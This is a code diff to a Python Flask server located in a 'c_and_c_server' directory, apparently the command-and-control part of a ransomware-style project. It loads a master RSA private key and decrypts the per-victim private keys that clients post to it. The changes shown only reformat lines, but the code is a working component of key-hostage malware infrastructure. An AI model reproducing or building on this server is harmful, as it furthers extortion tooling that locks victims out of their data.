@@ -10,7 +10,9 @@ app = Flask(__name__)
 logger = logging.getLogger(__name__)
 RSA_KEY_SIZE_IN_BITS = 2048
 RSA_PUBLIC_EXPONENT = 65537
-MASTER_PRIVATE_KEY = open("/Users/surya/Desktop/Druid/c_and_c_server/MASTER_PRIVATE_KEY","rb").read()
+MASTER_PRIVATE_KEY = open(
+    "/Users/surya/Desktop/Druid/c_and_c_server/MASTER_PRIVATE_KEY", "rb"
+).read()
 
 
 class RSA:
@@ -63,7 +65,7 @@ def decrypt_rsa_key(encrypted_key):
     unencrypted_local_private_key = b"".join(
         [cipher.decrypt_data(key_part) for key_part in encrypted_key]
     )
-    payload = {"key":b64encode(unencrypted_local_private_key).decode("ascii")}
+    payload = {"key": b64encode(unencrypted_local_private_key).decode("ascii")}
     return payload
 
 
@@ -71,9 +73,13 @@ def decrypt_rsa_key(encrypted_key):
 def hello_world():
     request_data = request.get_json()
     if request_data.get("payload"):
-        return decrypt_rsa_key([b64decode(part) for part in request_data.get("payload")])
+        return decrypt_rsa_key(
+            [b64decode(part) for part in request_data.get("payload")]
+        )
     else:
-        return {"message":"He killed three men in a bar with a pencil, WITH A F'KIN PENCIL"}
+        return {
+            "message": "He killed three men in a bar with a pencil, WITH A F'KIN PENCIL"
+        }
 
 
 if __name__ == "__main__":
